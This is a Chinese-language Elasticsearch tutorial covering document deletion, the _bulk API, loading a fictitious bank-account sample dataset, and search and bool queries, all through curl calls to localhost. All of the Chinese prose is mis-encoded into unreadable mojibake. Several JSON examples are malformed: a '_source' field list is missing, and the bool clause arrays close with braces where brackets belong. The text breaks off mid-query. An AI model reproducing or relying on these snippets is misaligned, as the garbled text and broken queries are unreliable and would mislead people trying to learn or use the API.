æ³¨æ„ï¼Œåœ¨å†™ä½œæœ¬æ–‡æ—¶ï¼Œæ›´æ–°æ“ä½œåªèƒ½ä¸€æ¬¡åº”ç”¨åœ¨ä¸€ä¸ªæ–‡æ¡£ä¸Šã€‚å°†æ¥ï¼ŒElasticsearchå°†æä¾›åŒæ—¶æ›´æ–°ç¬¦åˆæŒ‡å®šæŸ¥è¯¢æ¡ä»¶çš„å¤šä¸ªæ–‡æ¡£çš„åŠŸèƒ½ï¼ˆç±»ä¼¼äºSQLçš„UPDATE-WHEREè¯­å¥ï¼‰ã€‚åˆ é™¤æ–‡æ¡£ åˆ é™¤æ–‡æ¡£æ˜¯ç›¸å½“ç›´è§‚çš„ã€‚ä»¥ä¸‹çš„ä¾‹å­å±•ç¤ºäº†æˆ‘ä»¬æ€æ ·åˆ é™¤IDä¸º2çš„æ–‡æ¡£ï¼š curl -XDELETE â€˜localhost:9200/customer/external/2?prettyâ€™ æˆ‘ä»¬ä¹Ÿèƒ½å¤Ÿä¸€æ¬¡åˆ é™¤ç¬¦åˆæŸä¸ªæŸ¥è¯¢æ¡ä»¶çš„å¤šä¸ªæ–‡æ¡£ã€‚ä»¥ä¸‹çš„ä¾‹å­å±•ç¤ºäº†å¦‚ä½•åˆ é™¤åå­—ä¸­åŒ…å«â€œJohnâ€çš„æ‰€æœ‰çš„å®¢æˆ·ï¼š curl -XDELETE â€˜localhost:9200/customer/external/_query?prettyâ€™ -d â€™ { â€œqueryâ€: { â€œmatchâ€: { â€œnameâ€: â€œJohnâ€ } } }â€™ æ³¨æ„ï¼Œä»¥ä¸Šçš„URIå˜æˆäº†/_queryï¼Œä»¥æ­¤æ¥è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªâ€œæŸ¥è¯¢åˆ é™¤â€APIï¼Œå…¶ä¸­åˆ é™¤æŸ¥è¯¢æ ‡å‡†æ”¾åœ¨è¯·æ±‚ä½“ä¸­ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶ä½¿ç”¨DELETEã€‚ç°åœ¨å…ˆä¸è¦æ‹…å¿ƒæŸ¥è¯¢è¯­æ³•ï¼Œæˆ‘ä»¬å°†ä¼šåœ¨æœ¬æ•™ç¨‹åé¢çš„éƒ¨åˆ†ä¸­æ¶‰åŠã€‚æ‰¹å¤„ç†ï¼š é™¤äº†èƒ½å¤Ÿå¯¹å•ä¸ªçš„æ–‡æ¡£è¿›è¡Œç´¢å¼•ã€æ›´æ–°å’Œåˆ é™¤ä¹‹å¤–ï¼ŒElasticsearchä¹Ÿæä¾›äº†ä»¥ä¸Šæ“ä½œçš„æ‰¹é‡å¤„ç†åŠŸèƒ½ï¼Œè¿™æ˜¯é€šè¿‡ä½¿ç”¨_bulk APIå®ç°çš„ã€‚è¿™ä¸ªåŠŸèƒ½ä¹‹æ‰€ä»¥é‡è¦ï¼Œåœ¨äºå®ƒæä¾›äº†éå¸¸é«˜æ•ˆçš„æœºåˆ¶æ¥å°½å¯èƒ½å¿«çš„å®Œæˆå¤šä¸ªæ“ä½œï¼Œä¸æ­¤åŒæ—¶ä½¿ç”¨å°½å¯èƒ½å°‘çš„ç½‘ç»œå¾€è¿”ã€‚ ä½œä¸ºä¸€ä¸ªå¿«é€Ÿçš„ä¾‹å­ï¼Œä»¥ä¸‹è°ƒç”¨åœ¨ä¸€æ¬¡bulkæ“ä½œä¸­ç´¢å¼•äº†ä¸¤ä¸ªæ–‡æ¡£ï¼ˆID 1 - John Doe and ID 2 - Jane Doeï¼‰: curl -XPOST â€˜localhost:9200/customer/external/_bulk?prettyâ€™ -d â€™ {â€œindexâ€:{&quot;_id&quot;:â€œ1â€}} {â€œnameâ€: â€œJohn Doeâ€ } {â€œindexâ€:{&quot;_id&quot;:â€œ2â€}} {â€œnameâ€: â€œJane Doeâ€ } â€™ ä»¥ä¸‹ä¾‹å­åœ¨ä¸€ä¸ªbulkæ“ä½œä¸­ï¼Œé¦–å…ˆæ›´æ–°ç¬¬ä¸€ä¸ªæ–‡æ¡£ï¼ˆIDä¸º1ï¼‰ï¼Œç„¶ååˆ é™¤ç¬¬äºŒä¸ªæ–‡æ¡£ï¼ˆIDä¸º2ï¼‰ï¼š curl -XPOST â€˜localhost:9200/customer/external/_bulk?prettyâ€™ -d â€™ {â€œupdateâ€:{&quot;_id&quot;:â€œ1â€}} {â€œdocâ€: { â€œnameâ€: â€œJohn Doe becomes Jane Doeâ€ } } {â€œdeleteâ€:{&quot;_id&quot;:â€œ2â€}} â€™ æ³¨æ„ä¸Šé¢çš„deleteåŠ¨ä½œï¼Œç”±äºåˆ é™¤åŠ¨ä½œåªéœ€è¦è¢«åˆ é™¤æ–‡æ¡£çš„IDï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰å¯¹åº”çš„æºæ–‡æ¡£ã€‚ bulk APIæŒ‰é¡ºåºæ‰§è¡Œè¿™äº›åŠ¨ä½œã€‚å¦‚æœå…¶ä¸­ä¸€ä¸ªåŠ¨ä½œå› ä¸ºæŸäº›åŸå› å¤±è´¥äº†ï¼Œå°†ä¼šç»§ç»­å¤„ç†å®ƒåé¢çš„åŠ¨ä½œã€‚å½“bulk APIè¿”å›æ—¶ï¼Œå®ƒå°†æä¾›æ¯ä¸ªåŠ¨ä½œçš„çŠ¶æ€ï¼ˆæŒ‰ç…§åŒæ ·çš„é¡ºåºï¼‰ï¼Œæ‰€ä»¥ä½ èƒ½å¤Ÿçœ‹åˆ°æŸä¸ªåŠ¨ä½œæˆåŠŸä¸å¦ã€‚æ¢ç´¢ä½ çš„æ•°æ®æ ·æœ¬æ•°æ®é›† ç°åœ¨æˆ‘ä»¬å¯¹äºåŸºæœ¬çš„ä¸œè¥¿å·²ç»æœ‰äº†ä¸€äº›æ„Ÿè§‰ï¼Œç°åœ¨è®©æˆ‘ä»¬å°è¯•ä½¿ç”¨ä¸€äº›æ›´åŠ è´´è¿‘ç°å®çš„æ•°æ®é›†ã€‚æˆ‘å·²ç»å‡†å¤‡äº†ä¸€äº›å‡æƒ³çš„å®¢æˆ·çš„é“¶è¡Œè´¦æˆ·ä¿¡æ¯çš„JSONæ–‡æ¡£çš„æ ·æœ¬ã€‚æ–‡æ¡£å…·æœ‰ä»¥ä¸‹çš„æ¨¡å¼ï¼ˆschemaï¼‰ï¼š { &quot;account_number&quot;: 0, &quot;balance&quot;: 16623, &quot;firstname&quot;: &quot;Bradshaw&quot;, &quot;lastname&quot;: &quot;Mckenzie&quot;, &quot;age&quot;: 29, &quot;gender&quot;: &quot;F&quot;, &quot;address&quot;: &quot;244 Columbus Place&quot;, &quot;employer&quot;: &quot;Euron&quot;, &quot;email&quot;: &quot;bradshawmckenzie@euron.com&quot;, &quot;city&quot;: &quot;Hobucken&quot;, &quot;state&quot;: &quot;CO&quot; } æˆ‘æ˜¯åœ¨http://www.json-generator.com/ä¸Šç”Ÿæˆè¿™äº›æ•°æ®çš„ã€‚ è½½å…¥æ ·æœ¬æ•°æ® ä½ å¯ä»¥ä»https://github.com/bly2k/files/blob/master/accounts.zip?raw=trueä¸‹è½½è¿™ä¸ªæ ·æœ¬æ•°æ®é›†ã€‚å°†å…¶è§£å‹åˆ°å½“å‰ç›®å½•ä¸‹ï¼Œå¦‚ä¸‹ï¼Œå°†å…¶åŠ è½½åˆ°æˆ‘ä»¬çš„é›†ç¾¤é‡Œï¼š curl -XPOST 'localhost:9200/bank/account/_bulk?pretty' --data-binary @accounts.json curl 'localhost:9200/_cat/indices?v' å“åº”æ˜¯ï¼š curl 'localhost:9200/_cat/indices?v' health index pri rep docs.count docs.deleted store.size pri.store.size yellow bank 5 1 1000 0 424.4kb 424.4kb è¿™æ„å‘³ç€æˆ‘ä»¬æˆåŠŸæ‰¹é‡ç´¢å¼•äº†1000ä¸ªæ–‡æ¡£åˆ°é“¶è¡Œç´¢å¼•ä¸­ï¼ˆaccountç±»å‹ï¼‰ã€‚ æœç´¢API ç°åœ¨ï¼Œè®©æˆ‘ä»¬ä»¥ä¸€äº›ç®€å•çš„æœç´¢æ¥å¼€å§‹ã€‚æœ‰ä¸¤ç§åŸºæœ¬çš„æ–¹å¼æ¥è¿è¡Œæœç´¢ï¼šä¸€ç§æ˜¯åœ¨RESTè¯·æ±‚çš„URIä¸­å‘é€æœç´¢å‚æ•°ï¼Œå¦ä¸€ç§æ˜¯å°†æœç´¢å‚æ•°å‘é€åˆ°RESTè¯·æ±‚ ä½“ä¸­ã€‚è¯·æ±‚ä½“æ–¹æ³•çš„è¡¨è¾¾èƒ½åŠ›æ›´å¥½ï¼Œå¹¶ä¸”ä½ å¯ä»¥ä½¿ç”¨æ›´åŠ å¯è¯»çš„JSONæ ¼å¼æ¥å®šä¹‰æœç´¢ã€‚æˆ‘ä»¬å°†å°è¯•ä½¿ç”¨ä¸€æ¬¡è¯·æ±‚URIä½œä¸ºä¾‹å­ï¼Œä½†æ˜¯æ•™ç¨‹çš„åé¢éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°† ä»…ä»…ä½¿ç”¨è¯·æ±‚ä½“æ–¹æ³•ã€‚ æœç´¢çš„REST APIå¯ä»¥é€šè¿‡_searchç«¯ç‚¹æ¥è®¿é—®ã€‚ä¸‹é¢è¿™ä¸ªä¾‹å­è¿”å›bankç´¢å¼•ä¸­çš„æ‰€æœ‰çš„æ–‡æ¡£ï¼š curl 'localhost:9200/bank/_search?q=*&amp;pretty' æˆ‘ä»¬ä»”ç»†ç ”ç©¶ä¸€ä¸‹è¿™ä¸ªæŸ¥è¯¢è°ƒç”¨ã€‚æˆ‘ä»¬åœ¨bankç´¢å¼•ä¸­æœç´¢ï¼ˆ_searchç«¯ç‚¹ï¼‰ï¼Œå¹¶ä¸”q=*å‚æ•°æŒ‡ç¤ºElasticsearchå»åŒ¹é…è¿™ä¸ªç´¢å¼•ä¸­æ‰€æœ‰çš„æ–‡æ¡£ã€‚prettyå‚æ•°ï¼Œå’Œä»¥å‰ä¸€æ ·ï¼Œä»…ä»…æ˜¯å‘Šè¯‰Elasticsearchè¿”å›ç¾è§‚çš„JSONç»“æœã€‚ ä»¥ä¸‹æ˜¯å“åº”ï¼ˆéƒ¨åˆ†åˆ—å‡ºï¼‰ï¼š curl 'localhost:9200/bank/_search?q=*&amp;pretty' { &quot;took&quot; : 63, &quot;timed_out&quot; : false, &quot;_shards&quot; : { &quot;total&quot; : 5, &quot;successful&quot; : 5, &quot;failed&quot; : 0 }, &quot;hits&quot; : { &quot;total&quot; : 1000, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ { &quot;_index&quot; : &quot;bank&quot;, &quot;_type&quot; : &quot;account&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : {&quot;account_number&quot;:1,&quot;balance&quot;:39225,&quot;firstname&quot;:&quot;Amber&quot;,&quot;lastname&quot;:&quot;Duke&quot;,&quot;age&quot;:32,&quot;gender&quot;:&quot;M&quot;,&quot;address&quot;:&quot;880 Holmes Lane&quot;,&quot;employer&quot;:&quot;Pyrami&quot;,&quot;email&quot;:&quot;amberduke@pyrami.com&quot;,&quot;city&quot;:&quot;Brogan&quot;,&quot;state&quot;:&quot;IL&quot;} }, { &quot;_index&quot; : &quot;bank&quot;, &quot;_type&quot; : &quot;account&quot;, &quot;_id&quot; : &quot;6&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : {&quot;account_number&quot;:6,&quot;balance&quot;:5686,&quot;firstname&quot;:&quot;Hattie&quot;,&quot;lastname&quot;:&quot;Bond&quot;,&quot;age&quot;:36,&quot;gender&quot;:&quot;M&quot;,&quot;address&quot;:&quot;671 Bristol Street&quot;,&quot;employer&quot;:&quot;Netagy&quot;,&quot;email&quot;:&quot;hattiebond@netagy.com&quot;,&quot;city&quot;:&quot;Dante&quot;,&quot;state&quot;:&quot;TN&quot;} }, { &quot;_index&quot; : &quot;bank&quot;, &quot;_type&quot; : &quot;account&quot;, å¯¹äºè¿™ä¸ªå“åº”ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ä»¥ä¸‹çš„éƒ¨åˆ†ï¼š - took â€”â€” Elasticsearchæ‰§è¡Œè¿™ä¸ªæœç´¢çš„è€—æ—¶ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ - timed_out â€”â€” æŒ‡æ˜è¿™ä¸ªæœç´¢æ˜¯å¦è¶…æ—¶ - _shards â€”â€” æŒ‡å‡ºå¤šå°‘ä¸ªåˆ†ç‰‡è¢«æœç´¢äº†ï¼ŒåŒæ—¶ä¹ŸæŒ‡å‡ºäº†æˆåŠŸ/å¤±è´¥çš„è¢«æœç´¢çš„shardsçš„æ•°é‡ - hits â€”â€” æœç´¢ç»“æœ - hits.total â€”â€” èƒ½å¤ŸåŒ¹é…æˆ‘ä»¬æŸ¥è¯¢æ ‡å‡†çš„æ–‡æ¡£çš„æ€»æ•°ç›® - hits.hits â€”â€” çœŸæ­£çš„æœç´¢ç»“æœæ•°æ®ï¼ˆé»˜è®¤åªæ˜¾ç¤ºå‰10ä¸ªæ–‡æ¡£ï¼‰ - _scoreå’Œmax_score â€”â€” ç°åœ¨å…ˆå¿½ç•¥è¿™äº›å­—æ®µ ä½¿ç”¨è¯·æ±‚ä½“æ–¹æ³•çš„ç­‰ä»·æœç´¢æ˜¯ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;match_all&quot;: {} } }' è¿™é‡Œçš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œå¹¶ä¸æ˜¯å‘URIä¸­ä¼ é€’q=*ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨_search APIçš„è¯·æ±‚ä½“ä¸­POSTäº†ä¸€ä¸ªJSONæ ¼å¼è¯·æ±‚ä½“ã€‚æˆ‘ä»¬å°†åœ¨ä¸‹ä¸€éƒ¨åˆ†ä¸­è®¨è®ºè¿™ä¸ªJSONæŸ¥è¯¢ã€‚ å“åº”æ˜¯ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;match_all&quot;: {} } }' { &quot;took&quot; : 26, &quot;timed_out&quot; : false, &quot;_shards&quot; : { &quot;total&quot; : 5, &quot;successful&quot; : 5, &quot;failed&quot; : 0 }, &quot;hits&quot; : { &quot;total&quot; : 1000, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ { &quot;_index&quot; : &quot;bank&quot;, &quot;_type&quot; : &quot;account&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : {&quot;account_number&quot;:1,&quot;balance&quot;:39225,&quot;firstname&quot;:&quot;Amber&quot;,&quot;lastname&quot;:&quot;Duke&quot;,&quot;age&quot;:32,&quot;gender&quot;:&quot;M&quot;,&quot;address&quot;:&quot;880 Holmes Lane&quot;,&quot;employer&quot;:&quot;Pyrami&quot;,&quot;email&quot;:&quot;amberduke@pyrami.com&quot;,&quot;city&quot;:&quot;Brogan&quot;,&quot;state&quot;:&quot;IL&quot;} }, { &quot;_index&quot; : &quot;bank&quot;, &quot;_type&quot; : &quot;account&quot;, &quot;_id&quot; : &quot;6&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : {&quot;account_number&quot;:6,&quot;balance&quot;:5686,&quot;firstname&quot;:&quot;Hattie&quot;,&quot;lastname&quot;:&quot;Bond&quot;,&quot;age&quot;:36,&quot;gender&quot;:&quot;M&quot;,&quot;address&quot;:&quot;671 Bristol Street&quot;,&quot;employer&quot;:&quot;Netagy&quot;,&quot;email&quot;:&quot;hattiebond@netagy.com&quot;,&quot;city&quot;:&quot;Dante&quot;,&quot;state&quot;:&quot;TN&quot;} }, { &quot;_index&quot; : &quot;bank&quot;, &quot;_type&quot; : &quot;account&quot;, &quot;_id&quot; : &quot;13&quot;, æœ‰ä¸€ç‚¹éœ€è¦é‡ç‚¹ç†è§£ä¸€ä¸‹ï¼Œä¸€æ—¦ä½ å–å›äº†ä½ çš„æœç´¢ç»“æœï¼ŒElasticsearchå°±å®Œæˆäº†ä½¿å‘½ï¼Œå®ƒä¸ä¼šç»´æŠ¤ä»»ä½•æœåŠ¡å™¨ç«¯çš„èµ„æºæˆ–è€…åœ¨ä½ çš„ç»“æœä¸­æ‰“å¼€æ¸¸æ ‡ã€‚ è¿™æ˜¯å’Œå…¶å®ƒç±»ä¼¼SQLçš„å¹³å°çš„ä¸€ä¸ªé²œæ˜çš„å¯¹æ¯”ï¼Œ åœ¨é‚£äº›å¹³å°ä¸Šï¼Œä½ å¯ä»¥åœ¨å‰é¢å…ˆè·å–ä½ æŸ¥è¯¢ç»“æœçš„ä¸€éƒ¨åˆ†ï¼Œç„¶åå¦‚æœä½ æƒ³è·å–ç»“æœçš„å‰©ä½™éƒ¨åˆ†ï¼Œä½ å¿…é¡»ç»§ç»­è¿”å›æœåŠ¡ç«¯å»å–ï¼Œè¿™ä¸ªè¿‡ç¨‹ä½¿ç”¨ä¸€ç§æœ‰çŠ¶æ€çš„æœåŠ¡å™¨ç«¯æ¸¸ æ ‡æŠ€æœ¯ã€‚ ä»‹ç»æŸ¥è¯¢è¯­è¨€ Elasticsearchæä¾›ä¸€ç§JSONé£æ ¼çš„ç‰¹å®šé¢†åŸŸè¯­è¨€ï¼Œåˆ©ç”¨å®ƒä½ å¯ä»¥æ‰§è¡ŒæŸ¥è¯¢ã€‚è¿™æ¯ç§°ä¸ºæŸ¥è¯¢DSLã€‚è¿™ä¸ªæŸ¥è¯¢è¯­è¨€ç›¸å½“å…¨é¢ï¼Œç¬¬ä¸€çœ¼çœ‹ä¸Šå»å¯èƒ½æœ‰äº›å’„å’„é€¼äººï¼Œä½†æ˜¯æœ€å¥½çš„å­¦ä¹ æ–¹æ³•å°±æ˜¯ä»¥å‡ ä¸ªåŸºç¡€çš„ä¾‹å­æ¥å¼€å§‹ã€‚ å›åˆ°æˆ‘ä»¬ä¸Šä¸€ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬æ‰§è¡Œäº†è¿™ä¸ªæŸ¥è¯¢ï¼š { &quot;query&quot;: { &quot;match_all&quot;: {} } } åˆ†è§£ä»¥ä¸Šçš„è¿™ä¸ªæŸ¥è¯¢ï¼Œå…¶ä¸­çš„queryéƒ¨åˆ†å‘Šè¯‰æˆ‘æŸ¥è¯¢çš„å®šä¹‰ï¼Œmatch_alléƒ¨åˆ†å°±æ˜¯æˆ‘ä»¬æƒ³è¦è¿è¡Œçš„æŸ¥è¯¢çš„ç±»å‹ã€‚match_allæŸ¥è¯¢ï¼Œå°±æ˜¯ç®€å•åœ°æŸ¥è¯¢ä¸€ä¸ªæŒ‡å®šç´¢å¼•ä¸‹çš„æ‰€æœ‰çš„æ–‡æ¡£ã€‚ é™¤äº†è¿™ä¸ªqueryå‚æ•°ä¹‹å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¼ é€’å…¶å®ƒçš„å‚æ•°æ¥å½±å“æœç´¢ç»“æœã€‚æ¯”å¦‚ï¼Œä¸‹é¢åšäº†ä¸€æ¬¡match_allå¹¶åªè¿”å›ç¬¬ä¸€ä¸ªæ–‡æ¡£ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;match_all&quot;: {} }, &quot;size&quot;: 1 }' æ³¨æ„ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šsizeçš„å€¼ï¼Œé‚£ä¹ˆå®ƒé»˜è®¤å°±æ˜¯10ã€‚ ä¸‹é¢çš„ä¾‹å­ï¼Œåšäº†ä¸€æ¬¡match_allå¹¶ä¸”è¿”å›ç¬¬11åˆ°ç¬¬20ä¸ªæ–‡æ¡£ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;match_all&quot;: {} }, &quot;from&quot;: 10, &quot;size&quot;: 10 }' å…¶ä¸­çš„fromå‚æ•°ï¼ˆ0-basedï¼‰ä»å“ªä¸ªæ–‡æ¡£å¼€å§‹ï¼Œsizeå‚æ•°æŒ‡æ˜ä»fromå‚æ•°å¼€å§‹ï¼Œè¦è¿”å›å¤šå°‘ä¸ªæ–‡æ¡£ã€‚è¿™ä¸ªç‰¹æ€§å¯¹äºæœç´¢ç»“æœåˆ†é¡µæ¥è¯´éå¸¸æœ‰å¸®åŠ©ã€‚æ³¨æ„ï¼Œå¦‚æœä¸æŒ‡å®šfromçš„å€¼ï¼Œå®ƒé»˜è®¤å°±æ˜¯0ã€‚ ä¸‹é¢è¿™ä¸ªä¾‹å­åšäº†ä¸€æ¬¡match_allå¹¶ä¸”ä»¥è´¦æˆ·ä½™é¢é™åºæ’åºï¼Œæœ€åè¿”å‰åä¸ªæ–‡æ¡£ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;match_all&quot;: {} }, &quot;sort&quot;: { &quot;balance&quot;: { &quot;order&quot;: &quot;desc&quot; } } }' æ‰§è¡Œæœç´¢ ç°åœ¨æˆ‘ä»¬å·²ç»çŸ¥é“äº†å‡ ä¸ªåŸºæœ¬çš„å‚æ•°ï¼Œè®©æˆ‘ä»¬è¿›ä¸€æ­¥å‘æ˜æŸ¥è¯¢è¯­è¨€å§ã€‚é¦–å…ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿”å›æ–‡æ¡£çš„å­—æ®µã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯è¿”å›å®Œæ•´çš„JSONæ–‡æ¡£çš„ã€‚è¿™å¯ä»¥é€šè¿‡ sourceæ¥å¼•ç”¨ï¼ˆæœç´¢hitsä¸­çš„_sourceiå­—æ®µï¼‰ã€‚å¦‚æœæˆ‘ä»¬ä¸æƒ³è¿”å›å®Œæ•´çš„æºæ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šè¿”å›çš„å‡ ä¸ªå­—æ®µã€‚ ä¸‹é¢è¿™ä¸ªä¾‹å­è¯´æ˜äº†æ€æ ·è¿”å›ä¸¤ä¸ªå­—æ®µaccount_numberå’Œbalanceï¼ˆå½“ç„¶ï¼Œè¿™ä¸¤ä¸ªå­—æ®µéƒ½æ˜¯æŒ‡_sourceä¸­çš„å­—æ®µï¼‰ï¼Œä»¥ä¸‹æ˜¯å…·ä½“çš„æœç´¢ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;match_all&quot;: {} }, &quot;_source&quot;: }' æ³¨æ„åˆ°ä¸Šé¢çš„ä¾‹å­ä»…ä»…æ˜¯ç®€åŒ–äº†_sourceå­—æ®µã€‚å®ƒä»å°†ä¼šè¿”å›ä¸€ä¸ªå«åš_sourceçš„å­—æ®µï¼Œä½†æ˜¯ä»…ä»…åŒ…å«account_numberå’Œbalanceæ¥å¹´æ”¹é©å­—æ®µã€‚ å¦‚æœä½ æœ‰SQLèƒŒæ™¯ï¼Œä¸Šè¿°æŸ¥è¯¢åœ¨æ¦‚å¿µä¸Šæœ‰äº›åƒSQLçš„SELECT FROMã€‚ ç°åœ¨è®©æˆ‘ä»¬è¿›å…¥åˆ°æŸ¥è¯¢éƒ¨åˆ†ã€‚ä¹‹å‰ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†match_allæŸ¥è¯¢æ˜¯æ€æ ·åŒ¹é…åˆ°æ‰€æœ‰çš„æ–‡æ¡£çš„ã€‚ç°åœ¨æˆ‘ä»¬ä»‹ç»ä¸€ç§æ–°çš„æŸ¥è¯¢ï¼Œå«åšmatchæŸ¥è¯¢ï¼Œè¿™å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªç®€å•çš„å­—æ®µæœç´¢æŸ¥è¯¢ï¼ˆæ¯”å¦‚å¯¹åº”äºæŸä¸ªæˆ–æŸäº›ç‰¹å®šå­—æ®µçš„æœç´¢ï¼‰ã€‚ ä¸‹é¢è¿™ä¸ªä¾‹å­è¿”å›è´¦æˆ·ç¼–å·ä¸º20çš„æ–‡æ¡£ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;match&quot;: { &quot;account_number&quot;: 20 } } }' ä¸‹é¢è¿™ä¸ªä¾‹å­è¿”å›åœ°å€ä¸­åŒ…å«â€œmillâ€çš„æ‰€æœ‰è´¦æˆ·ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;match&quot;: { &quot;address&quot;: &quot;mill&quot; } } }' ä¸‹é¢è¿™ä¸ªä¾‹å­è¿”å›åœ°å€ä¸­åŒ…å«â€œmillâ€æˆ–è€…åŒ…å«â€œlaneâ€çš„è´¦æˆ·ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;match&quot;: { &quot;address&quot;: &quot;mill lane&quot; } } }' ä¸‹é¢è¿™ä¸ªä¾‹å­æ˜¯matchçš„å˜ä½“ï¼ˆmatch_phraseï¼‰ï¼Œå®ƒä¼šå»åŒ¹é…çŸ­è¯­â€œmill laneâ€ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;match_phrase&quot;: { &quot;address&quot;: &quot;mill lane&quot; } } }' ç°åœ¨ï¼Œè®©æˆ‘ä»¬ä»‹ç»ä¸€ä¸‹å¸ƒå°”æŸ¥è¯¢ã€‚å¸ƒå°”æŸ¥è¯¢å…è®¸æˆ‘ä»¬åˆ©ç”¨å¸ƒå°”é€»è¾‘å°†è¾ƒå°çš„æŸ¥è¯¢ç»„åˆæˆè¾ƒå¤§çš„æŸ¥è¯¢ã€‚ ç°åœ¨è¿™ä¸ªä¾‹å­ç»„åˆäº†ä¸¤ä¸ªmatchæŸ¥è¯¢ï¼Œè¿™ä¸ªç»„åˆæŸ¥è¯¢è¿”å›åŒ…å«â€œmillâ€å’Œâ€œlaneâ€çš„æ‰€æœ‰çš„è´¦æˆ·ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;bool&quot;: { &quot;must&quot;: [ { &quot;match&quot;: { &quot;address&quot;: &quot;mill&quot; } }, { &quot;match&quot;: { &quot;address&quot;: &quot;lane&quot; } } } } }' åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œbool mustè¯­å¥æŒ‡æ˜äº†ï¼Œå¯¹äºä¸€ä¸ªæ–‡æ¡£ï¼Œæ‰€æœ‰çš„æŸ¥è¯¢éƒ½å¿…é¡»ä¸ºçœŸï¼Œè¿™ä¸ªæ–‡æ¡£æ‰èƒ½å¤ŸåŒ¹é…æˆåŠŸã€‚ ç›¸åçš„ï¼Œä¸‹é¢çš„ä¾‹å­ç»„åˆäº†ä¸¤ä¸ªmatchæŸ¥è¯¢ï¼Œå®ƒè¿”å›çš„æ˜¯åœ°å€ä¸­åŒ…å«â€œmillâ€æˆ–è€…â€œlaneâ€çš„æ‰€æœ‰çš„è´¦æˆ·: curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;bool&quot;: { &quot;should&quot;: [ { &quot;match&quot;: { &quot;address&quot;: &quot;mill&quot; } }, { &quot;match&quot;: { &quot;address&quot;: &quot;lane&quot; } } } } }' åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œbool shouldè¯­å¥æŒ‡æ˜ï¼Œå¯¹äºä¸€ä¸ªæ–‡æ¡£ï¼ŒæŸ¥è¯¢åˆ—è¡¨ä¸­ï¼Œåªè¦æœ‰ä¸€ä¸ªæŸ¥è¯¢åŒ¹é…ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡æ¡£å°±è¢«çœ‹æˆæ˜¯åŒ¹é…çš„ã€‚ ç°åœ¨è¿™ä¸ªä¾‹å­ç»„åˆäº†ä¸¤ä¸ªæŸ¥è¯¢ï¼Œå®ƒè¿”å›åœ°å€ä¸­æ—¢ä¸åŒ…å«â€œmillâ€ï¼ŒåŒæ—¶ä¹Ÿä¸åŒ…å«â€œlaneâ€çš„æ‰€æœ‰çš„è´¦æˆ·ä¿¡æ¯ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;bool&quot;: { &quot;must_not&quot;: [ { &quot;match&quot;: { &quot;address&quot;: &quot;mill&quot; } }, { &quot;match&quot;: { &quot;address&quot;: &quot;lane&quot; } } } } }' åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œ bool must_notè¯­å¥æŒ‡æ˜ï¼Œå¯¹äºä¸€ä¸ªæ–‡æ¡£ï¼ŒæŸ¥è¯¢åˆ—è¡¨ä¸­çš„çš„æ‰€æœ‰æŸ¥è¯¢éƒ½å¿…é¡»éƒ½ä¸ä¸ºçœŸï¼Œè¿™ä¸ªæ–‡æ¡£æ‰è¢«è®¤ä¸ºæ˜¯åŒ¹é…çš„ã€‚ æˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ªboolæŸ¥è¯¢é‡Œä¸€èµ·ä½¿ç”¨mustã€shouldã€must_notã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å¯ä»¥å°†boolæŸ¥è¯¢æ”¾åˆ°è¿™æ ·çš„boolè¯­å¥ä¸­æ¥æ¨¡æ‹Ÿå¤æ‚çš„ã€å¤šç­‰çº§çš„å¸ƒå°”é€»è¾‘ã€‚ ä¸‹é¢è¿™ä¸ªä¾‹å­è¿”å›40å²ä»¥ä¸Šå¹¶ä¸”ä¸ç”Ÿæ´»åœ¨IDï¼ˆdahoï¼‰çš„äººçš„è´¦æˆ·ï¼š curl -XPOST 'localhost:9200/bank/_search?pretty' -d ' { &quot;query&quot;: { &quot;bool&quot;: { &quot;must&quot;: [ { 